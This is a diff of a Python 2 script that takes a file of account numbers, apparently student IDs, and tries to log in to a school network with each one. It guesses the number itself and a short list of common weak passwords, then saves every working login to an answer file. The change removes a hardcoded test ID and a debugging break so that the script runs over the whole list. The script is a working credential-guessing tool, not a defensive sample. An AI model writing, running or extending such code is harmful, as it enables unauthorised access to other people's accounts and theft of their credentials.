@@ -7,29 +7,29 @@ import urllib2
 import cookielib
 import string
 import re
+import logging
 from login_school_net import *
 F = open('number','r')
-Ans = open('Answer','w')
-
 Password = ['123456','654321','888888','666666','111111']
 
 def Get(Number):
+	Number = Number.strip()
 	if login_school_net(Number,Number):
-		Ans.writeln(Number+' '+Number)
+		Ans = open("Answer", 'a')
+		Ans.write(Number + ' ' + Number + '\n')
+		# Ans.close()
 	for i in Password:
 		if login_school_net(Number,i):
-			Ans.write(Number+' '+i + '\n')
+			Ans = open("Answer", 'a')
+			Ans.write(Number + ' ' + i + '\n')
+			# Ans.close()
 			return
-
-
 
 F = F.readlines()
 
 for i in F:
-	print i
-	i = "A01214002"
 	try:
+		print i
 		Get(i)
-	except Exception:
-		print Exception, i
-	break
+	except Exception, e:
+		logging.error("error" + i)
